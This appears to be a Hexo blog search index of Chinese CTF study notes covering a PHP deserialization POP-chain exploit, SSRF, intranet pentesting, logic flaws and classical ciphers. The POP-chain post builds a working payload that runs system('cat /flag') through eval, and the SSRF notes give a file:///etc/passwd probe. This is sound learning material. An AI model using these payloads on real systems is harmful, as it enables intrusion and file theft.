<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title></title>
      <link href="/posts/0.html"/>
      <url>/posts/0.html</url>
      
        <content type="html"><![CDATA[<h1 id="快速简单学习反序列化——POP-链"><a href="#快速简单学习反序列化——POP-链" class="headerlink" title="快速简单学习反序列化——POP 链"></a>快速简单学习反序列化——POP 链</h1><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><h3 id="1-魔术方法："><a href="#1-魔术方法：" class="headerlink" title="1.魔术方法："></a>1.魔术方法：</h3><p>__construct()    &#x2F;&#x2F;用于在创建对象时自动触发当使用 new 关键字实例化一个类时，会自动调用该类的 __construct() 方法<br>__destruct()     &#x2F;&#x2F;__destruct() 用于在对象被销毁时自动触发对象的销毁对象的引用计数减少为零来触发<br>__sleep()        &#x2F;&#x2F;序列化serialize() 函数会检查类中是否存在一个魔术方法sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组<br>__wakeup()       &#x2F;&#x2F;用于在反序列化对象时自动调用unserialize() 会检查是否存在一个 wakeup() 方法，如果存在，则会先调用wakeup()方法<br>__tostring()     &#x2F;&#x2F;__tostring() 在对象被当做字符串处理时自动调用比如echo、&#x3D;&#x3D;、preg_match()<br>__invoke()       &#x2F;&#x2F;__invoke() 在对象被当做函数处理时自动调用<br>__call()         &#x2F;&#x2F;__call($method, $args) 在调用一个不存在的方法时触发, $args是数组的形式<br>__callStatic()   &#x2F;&#x2F;__callStatic() 在静态调用或调用成员常量时使用的方法不存在时触发<br>__set()          &#x2F;&#x2F;__set() 在给不存在的成员属性赋值时触发<br>__isset()        &#x2F;&#x2F;__isset() 在对不可访问属性使用 isset() 或empty() 时会被触发<br>__unset()        &#x2F;&#x2F;__unset() 在对不可访问属性使用 unset() 时会被触发<br>__clone()        &#x2F;&#x2F;__clone() 当使用 clone 关键字拷贝完成一个对象后就会触发<br>__get()          &#x2F;&#x2F;__get() 当尝试访问不可访问属性时会被自动调用</p><p>例题1：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">class step0ne&#123;</span><br><span class="line">public $Manbo;</span><br><span class="line">public $Omogeli;</span><br><span class="line">public function __destruct()&#123;</span><br><span class="line">echo $this-&gt;Manbo;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">class steptw0&#123;</span><br><span class="line">public $zabuzabu;</span><br><span class="line">public $yedayeda;</span><br><span class="line">public function __tostring()&#123;</span><br><span class="line">$this-&gt;zabuzabu-&gt;manbo();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">class stepthr33&#123;</span><br><span class="line">public $hajimi;</span><br><span class="line">public $amiluosi;</span><br><span class="line">public function __call($method, $args)&#123;</span><br><span class="line">eval($this-&gt;hajimi);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="解："><a href="#解：" class="headerlink" title="解："></a>解：</h2><p><em>方法：找到出口以及入口，利用链条串起来</em></p><h3 id="1-出口："><a href="#1-出口：" class="headerlink" title="1.出口："></a>1.出口：</h3><p>看到eval，我们就知道33是出口，怎么才能触发call，需要一个不存在的函数</p><p>而且我们需要：</p><p>33-&gt;Hajimi&#x3D;’system(“cat &#x2F;flag”);’</p><h3 id="2-入口："><a href="#2-入口：" class="headerlink" title="2.入口："></a>2.入口：</h3><p>0ne存在一个echo，echo的处理逻辑不就是把东西弄成字符串吗，</p><p>那我们echo里面要放啥</p><p>One-&gt;manbo&#x3D;….</p><h3 id="3-链条："><a href="#3-链条：" class="headerlink" title="3.链条："></a>3.链条：</h3><p>two里面有tostring刚好可以和echo搭配。</p><p>当two被放在echo里面当成字符串时，触发了tostring，我们就把入口串起来了，</p><p>One-&gt;Manbo&#x3D;new two</p><p>然后two的zabuzabu就指向了manbo()，此时调用了manbo()函数，</p><p>如果manbo()刚好可以是实例33里面的不存在的函数，我们就把出口串起来了,</p><p>让zabuzabu是33实例，那么我们就用了this-&gt;zabuzabu-&gt;manbo()，让33有了一个不存在的manbo()</p><p>Two-&gt;zabuzabu&#x3D;new 33</p><p>于是得到链条：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">One-&gt;Manbo=new two</span><br><span class="line">Two-&gt;zabuzabu=new 33</span><br><span class="line">33-&gt;Hajimi=’system(“cat /flag”);’</span><br></pre></td></tr></table></figure><p>构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$obj = new step0ne;</span><br><span class="line"></span><br><span class="line">$obj-&gt;Manbo = new steptw0();</span><br><span class="line">$obj-&gt;Manbo-&gt;zabuzabu = new stepthr33;</span><br><span class="line">$obj-&gt;Manbo-&gt;zabuzabu-&gt;Hajimi=&#x27;system(&quot;cat /flag&quot;);&#x27;;   #必须加外层引号，表示是个字符串；因为eval处理字符</span><br><span class="line"></span><br><span class="line">echo serialize($obj);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/posts/0.html"/>
      <url>/posts/0.html</url>
      
        <content type="html"><![CDATA[<h1 id="为什么post传参和cookie的分隔符号不同？"><a href="#为什么post传参和cookie的分隔符号不同？" class="headerlink" title="为什么post传参和cookie的分隔符号不同？"></a>为什么post传参和cookie的分隔符号不同？</h1><p>在学传参的时候将常会遇到多传参的题目，但是cookie用的是<code>;</code>,post用的是<code>&amp;</code></p><p>它们诞生于不同的年代，服务于不同的标准，为了互不干扰，必须使用不同的“切割符”。</p><hr><h3 id="1-分隔符：来自“表单”的传统-HTML-标准"><a href="#1-分隔符：来自“表单”的传统-HTML-标准" class="headerlink" title="1. &amp; 分隔符：来自“表单”的传统 (HTML 标准)"></a>1. &amp; 分隔符：来自“表单”的传统 (HTML 标准)</h3><p><code>&amp;</code> 符号主要用于 <strong>URL 查询参数</strong>（GET）和 <strong>POST 请求体</strong>（<code>application/x-www-form-urlencoded</code>）。</p><ul><li><strong>起源</strong>：它是由 HTML 标准定义的。当我们提交一个网页表单时，浏览器需要一种方式把 <code>key1=value1</code>、<code>key2=value2</code> 串起来。</li><li><strong>为什么选 <code>&amp;</code></strong>：在早期的 ASCII 码表中，<code>&amp;</code> (Ampersand) 是一个常用的连接符，且在普通文本中出现的频率远低于逗号或分号，不容易引起歧义。</li><li><strong>结构示例</strong>： <code>user=admin&amp;pass=123456&amp;action=login</code></li></ul><hr><h3 id="2-分隔符：来自“饼干”的规范-HTTP-Cookie-标准"><a href="#2-分隔符：来自“饼干”的规范-HTTP-Cookie-标准" class="headerlink" title="2. ; 分隔符：来自“饼干”的规范 (HTTP Cookie 标准)"></a>2. ; 分隔符：来自“饼干”的规范 (HTTP Cookie 标准)</h3><p>Cookie 的格式是由专门的 <strong>RFC 规范</strong>（如 RFC 6265）定义的，它和 HTML 表单参数完全是两套体系。</p><ul><li><strong>起源</strong>：Cookie 诞生于 1994 年（由网景公司发明），比标准表单处理要晚一些。设计者希望 Cookie 的字符串能够和 URL 参数<strong>产生明显的视觉和逻辑区分</strong>。</li><li><strong>为什么选 <code>;</code></strong>：<ul><li><strong>避免冲突</strong>：如果 Cookie 也用 <code>&amp;</code> 分隔，那么当程序在处理一段既包含 URL 参数又包含 Cookie 的复杂字符串时，很容易发生“串味”。</li><li><strong>RFC 规范</strong>：HTTP 协议的 Header 字段（如 <code>Accept</code>, <code>Cache-Control</code>）通常都倾向于使用分号 <code>;</code> 或逗号 <code>,</code> 来分隔属性。Cookie 既然是 Header 的一部分，自然遵循了 Header 的家族传统。</li></ul></li><li><strong>结构示例</strong>： <code>Cookie: action=scan; sign=6d00fef7; sessionid=abc</code></li></ul><h2 id="记忆方式："><a href="#记忆方式：" class="headerlink" title="记忆方式："></a>记忆方式：</h2><table><thead><tr><th><strong>位置</strong></th><th><strong>格式名称</strong></th><th><strong>分隔符</strong></th><th><strong>举例</strong></th></tr></thead><tbody><tr><td><strong>第一层：URL 路径</strong></td><td>Query String</td><td><code>&amp;</code></td><td><code>?id=1&amp;type=web</code></td></tr><tr><td><strong>第二层：请求头 (Header)</strong></td><td>Cookie</td><td><code>;</code></td><td><code>Cookie: a=1; b=2</code></td></tr><tr><td><strong>第三层：请求体 (Body)</strong></td><td>Form Data</td><td><code>&amp;</code></td><td><code>user=admin&amp;token=xyz</code></td></tr></tbody></table>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>my-article</title>
      <link href="/posts/66b634a7.html"/>
      <url>/posts/66b634a7.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> 个人随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>codetijie</title>
      <link href="/posts/2b37188e.html"/>
      <url>/posts/2b37188e.html</url>
      
        <content type="html"><![CDATA[<h2 id="crypto题解"><a href="#crypto题解" class="headerlink" title="crypto题解"></a>crypto题解</h2><h2 id="大帝的密码武器"><a href="#大帝的密码武器" class="headerlink" title="大帝的密码武器"></a>大帝的密码武器</h2><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p>题解</p><p>FRPHEVGL偏移13位security</p><p>密文：ComeChina，通过偏移13</p><p>得到flag，注意大小写</p><h2 id="看我回旋踢"><a href="#看我回旋踢" class="headerlink" title="看我回旋踢"></a>看我回旋踢</h2><h3 id="1-1"><a href="#1-1" class="headerlink" title="1"></a>1</h3><ol><li>遇到synt{xx-xx-xx} 判定他为rot13；</li><li>题目一般都是提示信息，“回旋踢”就暗示了rot13的特点，会重新绕回；</li></ol><p>flag{5cd1004d-86a5-46d8-b720-beb5ba0417e1}</p><h2 id="moectf-misc-Cor1e的支票"><a href="#moectf-misc-Cor1e的支票" class="headerlink" title="moectf misc Cor1e的支票"></a>moectf misc Cor1e的支票</h2><p>解码网站：<a href="https://www.dcode.fr/ook-language">https://www.dcode.fr/ook-language</a></p><h2 id="Ook编码详解"><a href="#Ook编码详解" class="headerlink" title="Ook编码详解"></a><a href="https://ctf.bugku.com/tool/brainfuck">Ook编码详解</a></h2><p><a href="https://ctf.bugku.com/tool/brainfuck">1</a><a href="https://blog.csdn.net/m0_47311097/article/details/144930147">2</a><a href="https://www.cnblogs.com/harmor/p/17279609.html">3</a></p><p><strong>Ook!</strong> 是一种基于极简主义设计的编程语言，属于 esolang（怪异语言）的一种。它是从 <strong>Brainfuck</strong> 演变而来的，主要用于编码和解码任务。Ook! 的指令由简单的短语组成，例如 <em>Ook. Ook?</em> 或 <em>Ook! Ook!</em>，这些短语对应 Brainfuck 的操作符。</p><p>编码规则</p><p>Ook! 使用一组固定的短语来表示操作符，每个短语由两个单词组成。以下是 Ook! 和 Brainfuck 的对应关系：</p><ul><li><em>Ook. Ook.</em> 对应 <em>&gt;</em>（指针右移）</li><li><em>Ook! Ook!</em> 对应 <em>&lt;</em>（指针左移）</li><li><em>Ook. Ook!</em> 对应 <em>+</em>（当前单元格值加一）</li><li><em>Ook! Ook.</em> 对应 <em>-</em>（当前单元格值减一）</li><li><em>Ook! Ook?</em> 对应 <em>[</em>（循环开始）</li><li><em>Ook? Ook!</em> 对应 <em>]</em>（循环结束）</li><li><em>Ook. Ook?</em> 对应 <em>.</em>（输出当前单元格值）</li><li><em>Ook? Ook.</em> 对应 <em>,</em>（输入值到当前单元格）</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">。。。。。。。。。。。。。。。。。。。。！？！！。？。。。。。。。。。。。。。。。。。。。。？。？！。？。。。。。。。。。。。。。。。。。。！。。。。。！。？。。。。。。。！？！！。？！！！！！！？。？！。？！！！。！！！！！。？。。。。。。。。。！？！！。？。。。。。。。。？。？！。？。。！。？。。。。。。。！？！！。？！！！！！！？。？！。？！！！！！！！！！！！。？。。。。。。。。。！？！！。？。。。。。。。。？。？！。？。。。。。。。。。。！。？。。。。。。。。。！？！！。？！！！！！！！！？。？！。？！！！！！！！！！！！！！！！！！。？。。。。。。。！？！！。？。。。。。。？。？！。？。。。。。。！。。。。。。。！。？。。。。。。。。。。。。。。。。。！？！！。？！！！！！！！！！！！！！！！！？。？！。？！！！。？。。。。。。。。。。。。。。。！？！！。？。。。。。。。。。。。。。。？。？！。？。。。。。。！。！！！！！！！！！！！！！。？。。。。。。。。。。。！？！！。？！！！！！！！！！！？。？！。？！！！！！！！！！！！。？。。。。。。。。。。。。。！？！！。？。。。。。。。。。。。。？。？！。？。。。。。。。。。。。。。。。。。。！。？。。。。。。。。。。。。。！？！！。？！！！！！！！！！！！！？。？！。？！！！！！！！！！！！！！。？。。。。。。。。。。。！？！！。？。。。。。。。。。。？。？！。？。。。。！。。。。。。。。。。。。。！。？。。。。。。。。。。。。。。。！？！！。？！！！！！！！！！！！！！！？。？！。？！！！。？。。。。。。。。。。。。。。。！？！！。？。。。。。。。。。。。。。。？。？！。？。。。。。。。。。。。。。。。。。。。。。。。。。。！。！！！！！！！！！！！！！！！！！。！！！！！！！！！。！！！！！！！！！！！！！。？。。。。。。。。。。。。。！？！！。？！！！！！！！！！！！！？。？！。？！！！！！！！！！！！！！！！！！！！！！。？。。。。。。。。。。。。。。。。。！？！！。？。。。。。。。。。。。。。。。。？。？！。？。。。。！。？。。。。。。。。。！？！！。？！！！！！！！！？。？！。？！！！！！！！！！。？。。。。。。。。。。。！？！！。？！！！！！！！！！！？。？！。？！！！！！！！。？。。。。。。。！？！！。？。。。。。。？。？！。？。。。。。。。。！。？。。。。。。。。。。。。。！？！！。？。。。。。。。。。。。。？。？！。？。。。。。。。。。。。。。。。。。。！。？。</span><br></pre></td></tr></table></figure><p>替换为ook</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">。-&gt;Ook.</span><br><span class="line">！-&gt;Ook!</span><br><span class="line">？-&gt;Ook?</span><br></pre></td></tr></table></figure><h2 id="moectf-misc-Macross"><a href="#moectf-misc-Macross" class="headerlink" title="moectf misc Macross"></a>moectf misc Macross</h2><p>世界名画，笑死我了，看了个题解，他人好有趣</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">崉 崉            €   8  €   8    €?N  d   L           2         &#x27;  ?                             $ E N D         2   &#x27;  ?   !  ?                             $ E N D            !  ?     ?                             $ E N D              ?     ?                             $ E N D              ?     ?                             $ E N D              ?     ?                             $ E N D              ?   </span><br><span class="line">  ?                             $ E N D            </span><br><span class="line">  ?     ?                             $ E N D              ?     ?                             $ E N D              ?     ?                             $ E N D              ?     ?                             $ E N D               ?                                   $ E N D                                                 $ E N D                  ?   </span><br><span class="line">                            $ E N D            ?   </span><br><span class="line">  ?                               $ E N D            ?     ?                               $ E N D            ?     ?                               $ E N D            ?     ?   %                            $ E N D            ?   %  ?   +                   </span><br></pre></td></tr></table></figure><p><img src="/images/image-20251225194916353.png" alt="image-20251225194916353"></p><p><strong>分析这段文本的可能含义：</strong></p><ul><li><strong>设备控制码&#x2F;状态信息：</strong> 这些字符很可能是某种显示屏（如LCD驱动芯片 RA8806 的指令）或通信协议的原始数据。</li><li><strong>乱码（Glyph Corruption）：</strong> 字符 <code>宕 </code>, <code>鈧 </code>, <code>铮 </code>等显示异常，说明原始字节流被错误地解释或传输了。</li><li><strong>数据序列：</strong> <code>2</code>, <code>8</code>, <code>D</code>, <code>J</code>, <code>M</code>, <code>G</code>, <code>A</code>, <code>;</code>, <code>5</code>, <code>/</code>, <code>)</code> 可能是某种命令参数或数据值，遵循特定格式。</li><li><strong>结构化标记：</strong> <code>$END</code> 明确表示一个数据块的结束，这在网络通信、文件传输或设备驱动中很常见。</li></ul><p>说是鼠标移动的信息，下载个记录鼠标移动的软件，用画图打开运行文件就能看到名画</p><h2 id="moectf-misc-White-Album"><a href="#moectf-misc-White-Album" class="headerlink" title="moectf misc White Album"></a>moectf misc White Album</h2><p>在线条形码</p><p><a href="https://online-barcode-reader.inliteresearch.com/">https://online-barcode-reader.inliteresearch.com/</a></p><p><img src="/images/image-20251225200017128.png" alt="image-20251225200017128"></p><h2 id="moectf-misc-Augustine’s-Way-2"><a href="#moectf-misc-Augustine’s-Way-2" class="headerlink" title="moectf misc Augustine’s Way#2"></a>moectf misc Augustine’s Way#2</h2><p>奥古斯丁？？？打错了吧？？？奥古斯都</p><p>这要从罗马的第一位“皇帝”<a href="https://zhida.zhihu.com/search?content_id=1924561&content_type=Answer&match_order=1&q=%E5%A5%A5%E5%8F%A4%E6%96%AF%E9%83%BD&zhida_source=entity">奥古斯都</a></p><p>说起。奥古斯都本名叫屋大维（Gaius Octavius）。前44年，凯撒被刺，留下遗嘱把屋大维定为自己的继承人，因此屋大维的名字被改为Gaius Julius <strong>Caesar</strong> Octavianus，虽然在中文里仍译作屋大维，但实际上同时代的人已经只使用“凯撒”来称呼他了。</p><p>至于为什么“凯撒”这个名字被后来的皇帝延续使用下去，并不是因为它在罗马改制之前就变成了一个荣誉性质的称号。原因其实很简单：后来的几位皇帝，直到<a href="https://zhida.zhihu.com/search?content_id=1924561&content_type=Answer&match_order=1&q=%E5%B0%BC%E7%A6%84&zhida_source=entity">尼禄</a></p><p>为止，全是屋大维的亲戚。不管是血亲也好，养子也好，因为和屋大维的亲属关系，他们的姓氏有的本来就是凯撒。有的本来姓氏不是凯撒的，作为合法继承人他们通常被前任皇帝所领养，因此依据古罗马的领养惯例，其姓氏也变成了凯撒。</p><h2 id="moectf-misc-Ex-Viginere"><a href="#moectf-misc-Ex-Viginere" class="headerlink" title="moectf misc Ex Viginere?"></a>moectf misc Ex Viginere?</h2><h2 id="Ex-Viginere"><a href="#Ex-Viginere" class="headerlink" title="Ex Viginere?"></a>Ex Viginere?</h2><h3 id="350"><a href="#350" class="headerlink" title="350"></a>350</h3><p>这难道是<strong>维吉尼亚</strong>吗？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">text is a plain English text which only consists of lowercase letters (without any symbol)</span><br></pre></td></tr></table></figure><p>维吉尼亚对照表</p><p><img src="/images/330px-Vigen%C3%A8re_square.svg.png" alt="img"></p><p>例如，假设<a href="https://zh.wikipedia.org/wiki/%E6%98%8E%E6%96%87">明文</a>为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ATTACKATDAWN</span><br></pre></td></tr></table></figure><p>选择某一关键词并重复而得到密钥，如关键词为<code>LEMON</code>时，密钥为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LEMONLEMONLE</span><br></pre></td></tr></table></figure><p>对于明文的第一个字母<code>A</code>，对应密钥的第一个字母<code>L</code>，于是使用表格中<code>L</code>行字母表进行加密，得到<a href="https://zh.wikipedia.org/wiki/%E5%AF%86%E6%96%87">密文</a>第一个字母<code>L</code>。类似地，明文第二个字母为<code>T</code>，在表格中使用对应的<code>E</code>行进行加密，得到密文第二个字母<code>X</code>。以此类推，可以得到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">明文：ATTACKATDAWN</span><br><span class="line">密钥：LEMONLEMONLE</span><br><span class="line">密文：LXFOPVEFRNHR</span><br></pre></td></tr></table></figure><h2 id="moectf-misc-Ez-Vigenere"><a href="#moectf-misc-Ez-Vigenere" class="headerlink" title="moectf misc Ez Vigenere"></a>moectf misc Ez Vigenere</h2><h3 id="150"><a href="#150" class="headerlink" title="150"></a>150</h3><p>这题貌似是真的简单！ 但是你可能需要去知道什么是Vigenere~</p><p>同时，<strong>key</strong>我并没有告诉你哦</p><p><code>dlcawx{kec_ihq_fc_tgjwebpc_lk_iuwwgk}</code> </p><p>一个一个字母做密钥去试试，</p><p>moectf{the_key_of_vigenere_is_rxyyds}</p><p><img src="/images/image-20251225205747380.png" alt="image-20251225205747380"></p>]]></content>
      
      
      <categories>
          
          <category> ctf题解 </category>
          
          <category> crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ssrf</title>
      <link href="/posts/b7a1d97e.html"/>
      <url>/posts/b7a1d97e.html</url>
      
        <content type="html"><![CDATA[<h2 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h2><p><strong>SSRF 就是让 Web 服务器替你干活，去访问它能到但你不能到的地址</strong>。</p><p>举个 CTF 里的常见场景：</p><ol><li>你作为攻击者，只能访问目标网站的前台页面（比如<code>http://xxx.com/get.php?url=xxx</code>）；</li><li>这个网站的服务器，能访问自己的内网（比如<code>127.0.0.1</code>、<code>192.168.1.100</code>），这些内网地址你直接连不上；</li><li>你把参数改成 <code>url=http://127.0.0.1/flag.txt</code>，如果网站没过滤这个参数，就会让服务器自己去访问内网的<code>flag.txt</code>，然后把内容返回给你。</li></ol><p>核心就是<strong>借服务器的 “身份”，看它能看的东西</strong>，CTF 里常用来拿内网的 flag、扫内网端口。</p><h2 id="学习-SSRF-的关键技巧"><a href="#学习-SSRF-的关键技巧" class="headerlink" title="学习 SSRF 的关键技巧"></a>学习 SSRF 的关键技巧</h2><ol><li><strong>记协议</strong>：SSRF 常用协议是<code>http://</code>（访问内网服务）、<code>file://</code>（读本地文件）、<code>php://filter</code>（读源码）、<code>gopher://</code>（构造复杂请求，高阶用）；</li><li><strong>记绕过</strong>：遇到过滤就换内网地址写法（127.1、0、[::1]）、换协议（http→https）、加特殊字符（比如<code>@</code>、<code>#</code>）；</li><li><strong>找触发点</strong>：看到 URL&#x2F;redirect&#x2F;image 等参数，先试<code>?url=file:///etc/passwd</code>（Linux），能返回内容就是有 SSRF；</li><li><strong>练工具</strong>：入门不用工具，直接手动构造参数；进阶可以学 Burp Suite 抓包改参数，测试更多 Payload。</li></ol>]]></content>
      
      
      <categories>
          
          <category> ctf学习 </category>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssrf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网渗透</title>
      <link href="/posts/4e0a5250.html"/>
      <url>/posts/4e0a5250.html</url>
      
        <content type="html"><![CDATA[<h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><p><strong>CTF 里的内网渗透，就是拿下一台机器，从这台机器出发，横向攻击内网里其他机器，最终拿到目标 flag</strong>。</p><p>你可以把内网理解成一个 “封闭的局域网”—— 你一开始只能直接接触到一台 “边界机器”（比如 Web 服务器），但内网里还藏着数据库、其他服务器、甚至存储 flag 的主机，这些机器你没法直接访问，只能靠已经拿下的机器当 “跳板”。</p><h3 id="CTF-内网渗透的核心步骤（Web-入口为例）"><a href="#CTF-内网渗透的核心步骤（Web-入口为例）" class="headerlink" title="CTF 内网渗透的核心步骤（Web 入口为例）"></a>CTF 内网渗透的核心步骤（Web 入口为例）</h3><ol><li><strong>拿下边界机器（突破口）</strong></li></ol><p>先通过 Web 漏洞（比如 PHP 代码执行、文件上传、SSRF）拿到这台 Web 服务器的权限（比如<code>shell</code>）。</p><p>这一步是内网渗透的基础，没有这个跳板就没法继续。</p><p><strong>内网信息收集</strong></p><p>在跳板机上执行命令，摸清内网情况：</p><ul><li>查内网 IP 段：<code>ifconfig</code>&#x2F;<code>ip a</code>（比如发现内网是<code>192.168.1.0/24</code>）；</li><li>扫内网存活主机和开放端口：<code>ping</code>、<code>nmap</code>（比如发现<code>192.168.1.10</code>开了 MySQL 端口）；</li><li>找敏感信息：查看服务器里的配置文件（比如数据库账号密码、其他机器的登录凭证）。</li></ul><p><strong>横向移动（攻击其他机器）</strong></p><p>用收集到的信息攻击内网其他机器：</p><ul><li>比如用拿到的 MySQL 密码，登录<code>192.168.1.10</code>的数据库，找里面的 flag；</li><li>比如用跳板机的权限，扫描到<code>192.168.1.20</code>有漏洞，直接从跳板机发攻击 payload；</li><li>比如找到内网机器的 SSH 账号密码，直接远程登录。</li></ul><p><strong>纵向提权（可选）</strong></p><p>如果拿到的内网机器权限很低（比如<code>www-data</code>用户），就找漏洞提权到<code>root</code>，这样才能看更多敏感文件（比如<code>/root/flag.txt</code>）。</p><p><strong>找最终 flag</strong></p><ol><li>在内网的核心机器上，找到存储 flag 的文件，读取后完成任务。</li></ol><h3 id="CTF-里的常见特点"><a href="#CTF-里的常见特点" class="headerlink" title="CTF 里的常见特点"></a>CTF 里的常见特点</h3><ul><li>内网机器一般<strong>不联网</strong>，只能通过跳板机访问；</li><li>重点考<strong>信息收集能力</strong>，比如找配置文件里的密码、扫内网端口；</li><li>常用工具：<code>nmap</code>（扫端口）、<code>frp</code>&#x2F;<code>ew</code>（端口转发，方便本地操作内网机器）、<code>ssh</code>（远程登录）</li></ul>]]></content>
      
      
      <categories>
          
          <category> ctf学习 </category>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逻辑漏洞</title>
      <link href="/posts/3e52e2a3.html"/>
      <url>/posts/3e52e2a3.html</url>
      
        <content type="html"><![CDATA[<h2 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h2><p><strong>逻辑漏洞就是 Web 应用的 “业务流程设计缺陷”</strong> —— 不是代码语法写错了，而是开发者设计功能时，没考虑到攻击者会 “钻规则的空子”。</p><p>它和 SQL 注入、XSS 这类 “代码层漏洞” 不一样，逻辑漏洞藏在<strong>业务逻辑里</strong>，比如登录、支付、权限管理这些环节。</p><h3 id="CTF-里最常见的逻辑漏洞例子"><a href="#CTF-里最常见的逻辑漏洞例子" class="headerlink" title="CTF 里最常见的逻辑漏洞例子"></a>CTF 里最常见的逻辑漏洞例子</h3><ol><li><strong>越权访问</strong></li></ol><p>比如你登录用户 A 的账号，把 URL 里的<code>user_id=1</code>改成<code>user_id=2</code>，就能直接看用户 B 的信息 &#x2F; 订单。</p><p>原因：服务器没校验 “当前登录用户是否有权限访问这个 user_id”。</p><p><strong>密码重置绕过</strong></p><p>密码重置时，网站发了个验证链接<code>reset?token=abc123</code>，你把 token 改成<code>abc124</code>，居然能重置别人的密码。</p><p>原因：服务器没校验 token 和用户的绑定关系，或者 token 生成规则太简单。</p><p><strong>支付金额篡改</strong></p><p>下单时前端显示价格是 100 元，你抓包把请求里的<code>amount=100</code>改成<code>amount=0.01</code>，服务器居然直接按 0.01 元结算。</p><p>原因：服务器没对前端传过来的金额做二次校验，直接信任了用户输入。</p><p><strong>登录态绕过</strong></p><p>有些网站用<code>is_login=1</code>这种参数判断是否登录，你直接在 URL 里加<code>?is_login=1</code>，不用输账号密码就能进后台。</p><ol><li>原因：服务器把 “是否登录” 的判断交给了可被篡改的前端参数。</li></ol><h3 id="核心特点"><a href="#核心特点" class="headerlink" title="核心特点"></a>核心特点</h3><ul><li>没有固定的利用工具，全靠<strong>分析业务流程</strong>；</li><li>漏洞能不能利用，完全看开发者的逻辑严谨性；</li><li>CTF 里逻辑漏洞题往往很 “绕”，但利用成功后能直接拿 flag。</li></ul>]]></content>
      
      
      <categories>
          
          <category> ctf学习 </category>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逻辑漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>note</title>
      <link href="/posts/cfbdfa14.html"/>
      <url>/posts/cfbdfa14.html</url>
      
        <content type="html"><![CDATA[<h2 id="密码笔记"><a href="#密码笔记" class="headerlink" title="密码笔记"></a>密码笔记</h2><p>HEX、DEC、OCT 和 BIN含义如下：</p><ul><li>HEX，英文全称 <strong>Hexadecimal</strong>，表示<strong>十六进制</strong>。</li><li>DEC，英文全称 <strong>Decimal</strong>，表示<strong>十进制</strong>。</li><li>OCT，英文全称 <strong>Octal</strong>，表示<strong>八进制</strong>。</li><li>BIN，英文全称 <strong>Binary</strong>，表示<strong>二进制</strong>。</li></ul><h2 id="1-Quoted-printabl-可打印字符-引用-编码"><a href="#1-Quoted-printabl-可打印字符-引用-编码" class="headerlink" title="1.Quoted-printabl     可打印字符 引用 编码"></a>1.Quoted-printabl     可打印字符 引用 编码</h2><p>Quoted-printable编码是一种<strong>二进制数据在Internet上传输时的一种编码方式</strong>。 它将二进制数据转换成可打印的ASCII字符。 这种编码方式将每个非可打印字符 (ASCII值小于32或大于126)，如二进制数据的控制字符或扩展字符 (如汉字)，转换为一个等号”&#x3D;“加上它的ASCII值的16进制表示，如”x0A”会变成”&#x3D;0A”。</p><h2 id="2-栅栏密码"><a href="#2-栅栏密码" class="headerlink" title="2.栅栏密码"></a>2.栅栏密码</h2><p><a 